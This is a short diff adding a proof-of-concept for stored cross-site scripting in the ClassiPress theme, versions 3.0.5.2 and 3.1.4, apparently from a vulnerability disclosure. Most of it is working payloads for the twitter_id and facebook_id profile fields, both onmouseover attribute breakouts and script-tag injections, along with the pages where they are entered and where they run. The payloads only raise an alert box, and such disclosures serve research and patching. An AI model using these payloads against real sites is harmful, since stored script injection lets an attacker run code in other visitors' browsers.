@@ -1,0 +1,27 @@
+
+
+Proof-of-Concept Code:
+-------------------------
+
+Insertion page: http://www.example.com/author/profile/
+Infected page : http://www.example.com/author/attacker_username/
+Note: Some sites replace &quot;author&quot; with another path, this is not a vanilla configuration, however. 
+
+Version: ClassiPress 3.0.5.2
+Vulnerable Input Parameters:
+
+	twitter_id:  &quot; onmouseover=&quot;alert(&#039;XSS&#039;);
+	facebook_id: &quot; onmouseover=&quot;alert(&#039;XSS&#039;);
+    Alternate Exploit code:
+	twitter_id:  &quot;&gt;&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;&lt;div id=&quot;
+	facebook_id: &quot;&gt;&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;&lt;div id=&quot;
+
+
+Version: ClassiPress 3.1.4
+Vulnerable Input Parameters:
+	
+	twitter_id:  &quot; onmouseover=&#039;alert(&quot;XSS&quot;);&#039;&gt;&lt;
+	facebook_id: &quot; onmouseover=&#039;alert(&quot;XSS&quot;);&#039;&gt;&lt;
+
+
+
